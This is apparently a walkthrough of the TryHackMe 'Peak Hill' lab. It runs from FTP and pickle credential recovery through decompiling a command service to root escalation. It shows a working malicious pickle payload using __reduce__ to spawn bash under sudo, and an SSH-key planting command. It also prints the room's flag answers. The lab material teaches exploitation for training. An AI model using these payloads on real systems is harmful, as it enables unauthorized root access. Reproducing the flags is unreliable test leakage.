# Peak Hill — TryHackMe Walkthrough

> Exercises in Python library abuse and some exploitation techniques — covering FTP enumeration, binary decoding, Python pickle deserialization, reverse engineering a compiled Python service, and exploiting a SUID binary via pickle injection.

<p align="center"><a href="https://tryhackme.com/room/peakhill"><a href="https://imgbb.com/"><img src="https://i.ibb.co/67zvyBjS/1bd570868d5c18425b3d1876460c06ba.jpg" alt="1bd570868d5c18425b3d1876460c06ba" border="0"></a>

<p align="center">
  <a href="https://tryhackme.com/room/peakhill"><img src="https://img.shields.io/badge/TryHackMe-Peak%20Hill-red?style=for-the-badge&logo=tryhackme" alt="TryHackMe Badge"></a>
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Difficulty Badge">
  <img src="https://img.shields.io/badge/Platform-Linux-informational?style=for-the-badge&logo=linux" alt="Platform Badge">
  <img src="https://img.shields.io/badge/Focus-Python%20Exploitation-blueviolet?style=for-the-badge" alt="Focus Badge">
  <img src="https://img.shields.io/badge/Focus-Reverse%20Engineering-blue?style=for-the-badge" alt="Focus Badge">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | FTP Enumeration |
| 3 | Binary / Cryptography |
| 4 | Python Pickle Deserialization |
| 5 | Python Scripting (Decoder) |
| 6 | Reverse Engineering (`.pyc`) |
| 7 | Misconfigured / Abusable Binaries |

---

## Learning Objectives

- Perform a full TCP port scan and enumerate discovered services
- Retrieve hidden files from an anonymous FTP server
- Decode binary-encoded data using CyberChef
- Write a Python script to deserialize a pickle file and extract credentials
- Decompile a Python bytecode file (`.pyc`) to recover source code
- Decode long integers back to bytes using `Crypto.Util.number`
- Authenticate to a custom network service and abuse command execution
- Escalate privileges by injecting a malicious pickle payload into a SUID binary

---

## Prerequisites

- Nmap
- FTP client
- Python 3 with `pycryptodome` (`pip install pycryptodome`)
- `uncompyle6` (`pip install uncompyle6`)
- Netcat (`nc`)
- CyberChef (browser-based, no install required)
---

## [Task 1] — Peak Hill

### Step 1 — Full TCP Port Scan

**Approach:** Run a comprehensive Nmap scan across all 65,535 ports with service detection, script scanning, and OS detection. The `-Pn` flag skips the host discovery ping since ICMP may be filtered.

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ sudo nmap -p- -Pn -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-08 17:02 CEST
Nmap scan report for Machine_IP
Host is up (0.040s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE  VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp      vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:YOUR_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 04:d5:75:9d:c1:40:51:37:73:4c:42:30:38:b8:d6:df (RSA)
|   256 7f:95:1a:d7:59:2f:19:06:ea:c1:55:ec:58:35:0c:05 (ECDSA)
|_  256 a5:15:36:92:1c:aa:59:9b:8a:d8:ea:13:c9:c0:ff:b6 (ED25519)
7321/tcp open   swx?
| fingerprint-strings:
|   GenericLines, GetRequest, HTTPOptions, Help, ...:
|     Username: Password:
|   NULL:
|_    Username:
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 353.06 seconds
```

> **Note:** Four ports are of interest. Port 21 (FTP) stands out immediately because anonymous login is allowed — a common misconfiguration that lets anyone connect without credentials. Port 22 runs OpenSSH, which will be useful later. Port 7321 is an unrecognised custom service that responds with `Username: Password:` prompts, suggesting a hand-rolled authentication daemon running on the target.

---

### Step 2 — Anonymous FTP Enumeration

**Approach:** Connect to FTP using the anonymous account (blank password accepted), then list all files including hidden ones with `ls -la`. Hidden files on Linux start with a dot and are invisible to a plain `ls`.

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ ftp Machine_IP
Connected to Machine_IP.
220 (vsFTPd 3.0.3)
Name (Machine_IP:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 .
drwxr-xr-x    2 ftp      ftp          4096 May 15 18:37 ..
-rw-r--r--    1 ftp      ftp          7048 May 15 18:37 .creds
-rw-r--r--    1 ftp      ftp            17 May 15 18:37 test.txt
226 Directory send OK.
```

> **Note:** The plain `ls` shown in Nmap's script output only revealed `test.txt`, but `ls -la` exposes `.creds` — a hidden file of 7,048 bytes. This is a deliberate trap: the room wants you to look more carefully. Download both files with `get .creds` and `get test.txt` before closing the FTP session.

---

### Step 3 — Decode the Binary-Encoded Credential File

**Approach:** The `.creds` file contains a large blob of binary data (1s and 0s separated by spaces). Paste the content into CyberChef and use the **From Binary** recipe (delimiter: Space) to decode it back to text.

The CyberChef URL from the raw notes encodes the full binary blob and produces readable output. After decoding you will see something resembling garbled pickle data — this is a serialised Python object, not plain text.

> **Note:** CyberChef's From Binary operation converts each space-delimited byte from binary representation (e.g. `01101000`) into its ASCII character. The output looks like garbage because it is a Python pickle stream — a binary serialisation format, not human-readable text. The next step handles deserialization properly in Python.

---

### Step 4 — Write a Python Pickle Decoder

**Approach:** The decoded binary is a Python pickle object containing a dictionary of SSH username and password fragments stored under keys like `ssh_user0`, `ssh_pass0`, etc. Write a short Python script to load the pickle, sort the keys, and reassemble the credential strings.

After running the decoder:

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ python3 decode_pickel.py
SSH user: gherkin
SSH pass: p1ckl3s_@11_@r0und_th3_w0rld
```

> **Note:** Python's `pickle` module can deserialise arbitrary objects — which is exactly what makes it dangerous in web applications. Here, the pickle stores credential fragments across numbered keys (`ssh_user0`, `ssh_user1`, …, `ssh_pass0`, `ssh_pass1`, …). Sorting the keys alphabetically and concatenating each group reassembles the full username and password. The result is a valid SSH login for the user `gherkin`.

---

### Step 5 — SSH into the Target as gherkin

**Approach:** Use the recovered credentials to log in over SSH and examine the home directory.

```
gherkin@ubuntu-xenial:~$ ls -la
total 16
drwxr-xr-x 3 gherkin gherkin 4096 Oct  8 15:24 .
drwxr-xr-x 4 root    root    4096 May 15 18:38 ..
drwx------ 2 gherkin gherkin 4096 Oct  8 15:24 .cache
-rw-r--r-- 1 root    root    2350 May 15 18:37 cmd_service.pyc
gherkin@ubuntu-xenial:~$
```

> **Note:** There is no flag here yet. The interesting file is `cmd_service.pyc` — a compiled Python bytecode file owned by root. The `.pyc` extension means the original `.py` source was compiled; the binary cannot be read directly but can be decompiled. Download this file to your attacking machine for reverse engineering.

---

### Step 6 — Decompile the Python Bytecode

**Approach:** Transfer `cmd_service.pyc` to your machine and use `uncompyle6` to recover the original Python source. This reveals how the custom service on port 7321 authenticates users.

```python
kali@kali:~/CTFs/tryhackme/Peak Hill$ uncompyle6 cmd_service.pyc
# uncompyle6 version 3.7.4
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.8.2 (default, Apr  1 2020, 15:52:55)
# [GCC 9.3.0]
# Embedded file name: ./cmd_service.py
# Compiled at: 2020-05-14 19:55:16
# Size of source mod 2**32: 2140 bytes
from Crypto.Util.number import bytes_to_long, long_to_bytes
import sys, textwrap, socketserver, string, readline, threading
from time import *
import getpass, os, subprocess
username = long_to_bytes(1684630636)
password = long_to_bytes(2457564920124666544827225107428488864802762356)

class Service(socketserver.BaseRequestHandler):

    def ask_creds(self):
        username_input = self.receive(b'Username: ').strip()
        password_input = self.receive(b'Password: ').strip()
        print(username_input, password_input)
        if username_input == username:
            if password_input == password:
                return True
        return False

    def handle(self):
        loggedin = self.ask_creds()
        if not loggedin:
            self.send(b'Wrong credentials!')
            return None
        self.send(b'Successfully logged in!')
        while True:
            command = self.receive(b'Cmd: ')
            p = subprocess.Popen(command,
              shell=True, stdout=(subprocess.PIPE), stderr=(subprocess.PIPE))
            self.send(p.stdout.read())

    def send(self, string, newline=True):
        if newline:
            string = string + b'\n'
        self.request.sendall(string)

    def receive(self, prompt=b'> '):
        self.send(prompt, newline=False)
        return self.request.recv(4096).strip()


class ThreadedService(socketserver.ThreadingMixIn, socketserver.TCPServer, socketserver.DatagramRequestHandler):
    pass


def main():
    print('Starting server...')
    port = 7321
    host = '0.0.0.0'
    service = Service
    server = ThreadedService((host, port), service)
    server.allow_reuse_address = True
    server_thread = threading.Thread(target=(server.serve_forever))
    server_thread.daemon = True
    server_thread.start()
    print('Server started on ' + str(server.server_address) + '!')
    while True:
        sleep(10)


if __name__ == '__main__':
    main()
# okay decompiling cmd_service.pyc
```

> **Note:** The decompiled source shows two critical things. First, the username and password are stored as large integers and converted to bytes using `long_to_bytes` from the `pycryptodome` library. Second, once authenticated, the service passes any input directly to `subprocess.Popen` with `shell=True` — meaning it executes arbitrary shell commands on the server. This is the command execution primitive needed to read the user flag and escalate privileges.

---

### Step 7 — Decode the Service Credentials

**Approach:** Use Python's `Crypto.Util.number.long_to_bytes` to convert the two integer literals from the decompiled source into their byte-string equivalents.

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ python3
Python 3.8.2 (default, Apr  1 2020, 15:52:55)
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from Crypto.Util.number import long_to_bytes
>>> print(long_to_bytes(1684630636))
b'dill'
>>> print(long_to_bytes(2457564920124666544827225107428488864802762356))
b'n3v3r_@_d1ll_m0m3nt'
>>>
```

> **Note:** `long_to_bytes` is the reverse of `bytes_to_long` — it interprets an integer as a big-endian sequence of bytes and converts it back to a byte string. The username is `dill` and the password is `n3v3r_@_d1ll_m0m3nt`. These are the credentials for the custom service running on port 7321.

---

### Step 8 — Connect to the Custom Service and Read the User Flag

**Approach:** Use netcat to connect to port 7321, authenticate with the decoded credentials, and run shell commands to find the user flag. Then plant an SSH public key in `dill`'s authorized_keys to get a proper SSH session.

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ nc Machine_IP 7321
Username: dill
Password: n3v3r_@_d1ll_m0m3nt
Successfully logged in!
Cmd: ls -la
total 12
drwxr-xr-x  2 root root 4096 May 15 18:38 .
drwxr-xr-x 15 root root 4096 May 15 18:38 ..
-r-xr-x---  1 dill dill 2141 May 15 18:38 .cmd_service.py

Cmd: pwd
/var/cmd

Cmd: whoami
dill

Cmd: cat /home/dill/user.txt
[user flag hidden — see answer below]

Cmd: echo "ssh-rsa XYZ= kali@kali" >> /home/dill/.ssh/authorized_keys
```

> **Note:** The service runs as the user `dill`, which gives read access to `/home/dill/user.txt`. Adding your SSH public key to `dill`'s `authorized_keys` file upgrades the fragile netcat shell to a proper interactive SSH session, which is essential for the privilege escalation step that follows.

---

### Task 1.1 — What is the user flag?

<details><summary>Reveal Answer</summary>

f1e13335c47306e193212c98fc07b6a0

</details>

---

### Step 9 — SSH in as dill and Check sudo Permissions

**Approach:** Log in over SSH using the key planted in the previous step, then run `sudo -l` to see which commands `dill` can execute with elevated privileges.

```
kali@kali:~/CTFs/tryhackme/Peak Hill$ ssh dill@Machine_IP
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-177-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

28 packages can be updated.
19 updates are security updates.

Last login: Wed May 20 21:56:05 2020 from 10.1.122.133
dill@ubuntu-xenial:~$ pwd
/home/dill
dill@ubuntu-xenial:~$ sudo -l
Matching Defaults entries for dill on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dill may run the following commands on ubuntu-xenial:
    (ALL : ALL) NOPASSWD: /opt/peak_hill_farm/peak_hill_farm
dill@ubuntu-xenial:~$
```

> **Note:** `dill` can run `/opt/peak_hill_farm/peak_hill_farm` as any user including root, with no password required. This is the privilege escalation vector. The binary's name and the room's theme strongly hint that it consumes pickle data — the same serialisation format used to hide the SSH credentials earlier. Supplying a malicious pickle payload that spawns a shell will execute as root.

---

### Step 10 — Craft a Malicious Pickle Payload and Escalate to Root

**Approach:** Python's `pickle` module executes arbitrary code during deserialisation when a class defines `__reduce__`. Define a class whose `__reduce__` returns `os.system` called with `/bin/bash`, serialise it to bytes, base64-encode the result, then supply that string to the farm binary running as root.

```
dill@ubuntu-xenial:/opt/peak_hill_farm$ python3
Python 3.5.2 (default, Apr 16 2020, 17:47:17)
[GCC 5.4.0 20160609] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> import pickle
>>> import base64
>>> class evil_object(object):
...     def __reduce__(self):
...         return (os.system, ('/bin/bash',))
...
>>> x = evil_object()
>>> holdit = pickle.dumps(x)
>>> base64.b64encode(holdit)
b'gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4='
>>>
dill@ubuntu-xenial:/opt/peak_hill_farm$ sudo ./peak_hill_farm
Peak Hill Farm 1.0 - Grow something on the Peak Hill Farm!

to grow: gANjcG9zaXgKc3lzdGVtCnEAWAkAAAAvYmluL2Jhc2hxAYVxAlJxAy4=
root@ubuntu-xenial:/opt/peak_hill_farm#
```

> **Note:** This is a textbook pickle deserialization attack — the same class of vulnerability that affects Python web frameworks when they accept untrusted serialised data. When `pickle.loads` processes the payload, it calls `__reduce__` and executes `os.system('/bin/bash')` in the context of the running process. Because the binary was launched with `sudo`, that process is root, so the resulting shell is a root shell. For further reading on this technique, see [https://exploit-db.com](https://www.exploit-db.com) for real-world examples of pickle injection exploits.

---

### Step 11 — Read the Root Flag

**Approach:** From the root shell, use `find` to locate the root flag and print its contents in one command.

```
root@ubuntu-xenial:/opt/peak_hill_farm# find /root/ -name "*root.txt*" -exec cat {} \;
[root flag hidden — see answer below]
```

> **Note:** The `find … -exec cat {} \;` pattern is useful when you do not know the exact path of a file. It searches `/root/` recursively for any filename matching `*root.txt*` and pipes each match through `cat`. Here it produces the root flag directly.

---

### Task 1.2 — What is the root flag?

<details><summary>Reveal Answer</summary>

e88f0a01135c05cf0912cf4bc335ee28

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Full TCP scan with Nmap | Discovered FTP (21), SSH (22), and a custom auth service (7321) |
| 2 | Anonymous FTP login with `ls -la` | Found hidden file `.creds` alongside `test.txt` |
| 3 | Decoded binary blob in CyberChef (From Binary) | Revealed a Python pickle stream |
| 4 | Wrote Python pickle decoder | Recovered SSH username and password for `gherkin` |
| 5 | SSH login as `gherkin` | Found `cmd_service.pyc` in the home directory |
| 6 | Decompiled `.pyc` with `uncompyle6` | Recovered full source of the port 7321 service |
| 7 | Decoded long integers with `long_to_bytes` | Recovered credentials for the custom service (`dill`) |
| 8 | Connected via netcat to port 7321 | Executed commands as `dill`, read the user flag, planted SSH key |
| 9 | SSH login as `dill`, ran `sudo -l` | Discovered NOPASSWD access to `/opt/peak_hill_farm/peak_hill_farm` |
| 10 | Crafted malicious pickle payload, ran farm binary as root | Obtained a root shell via pickle deserialization |
| 11 | Used `find` to locate and read `root.txt` | Retrieved the root flag |
